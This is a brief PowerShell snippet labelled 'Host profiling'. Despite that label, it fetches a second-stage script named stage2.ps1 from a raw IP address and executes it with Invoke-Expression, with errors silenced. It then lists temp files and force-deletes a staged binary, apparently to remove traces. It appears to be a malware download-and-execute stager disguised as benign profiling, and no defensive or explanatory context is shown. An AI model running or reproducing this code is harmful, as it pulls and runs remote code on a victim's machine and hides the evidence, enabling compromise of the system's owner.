
<# Host profiling #> $FetchUrl = 'https://192.0.2.65:443/stage2.ps1'; IEX (Invoke-WebRequest -Uri $FetchUrl -UseBasicParsing -ErrorAction SilentlyContinue).Content; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
